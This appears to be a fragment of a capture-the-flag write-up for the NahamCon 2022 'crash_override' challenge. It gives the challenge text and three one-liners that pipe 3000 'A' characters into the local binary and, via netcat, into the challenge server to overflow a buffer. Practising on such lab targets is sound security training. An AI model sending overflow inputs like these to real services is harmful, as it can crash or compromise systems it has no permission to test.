```
Remember, hacking is more than just a crime. It's a survival trait.

PS (not challenge related), thank you so much to HackTheBox for supporting NahamCon 2022!



Press the Start button on the top-right to begin this challenge.
Connect with:
nc challenge.nahamcon.com 32642
Please allow up to 30 seconds for the challenge to become available.
```

```
python -c "print('A'*3000)" | ./crash_override
python -c "print('A'*3000)" | nc challenge.nahamcon.com 32642
python -c "print('A'*3000)" | nc challenge.nahamcon.com 31050
```